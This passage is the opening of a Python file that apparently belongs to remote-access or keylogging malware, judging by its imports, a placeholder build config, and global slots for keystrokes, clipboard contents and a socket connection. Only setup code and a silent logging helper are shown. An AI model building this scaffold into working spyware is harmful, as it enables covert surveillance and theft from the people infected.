import os, sys, io, re, json, time, zlib, base64, socket, ssl, struct, random, string
import threading, queue, hashlib, uuid, shutil, sqlite3, glob, subprocess, tempfile, platform
import traceback
import ctypes, ctypes.wintypes as wt
from datetime import datetime, timedelta
from Crypto.Cipher import AES

CFG = __CFG__

G = {"run": False, "start": time.time(), "threads": {}}
g_lock = threading.RLock()
g_conn = {"s": None}
g_out = queue.Queue()
g_keys = []
g_clip = ""


def f_log(name, msg):
    try:
        d = G.get("dir") or tempfile.gettempdir()
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, name), "a", encoding="utf-8", errors="replace") as fh:
            fh.write(time.strftime("%Y-%m-%d %H:%M:%S ") + str(msg) + "\n")
    except Exception:
        pass
    if CFG.get("debug"):
        try:
            print("[" + name + "] " + str(msg), file=sys.stderr, flush=True)
        except Exception:
            pass
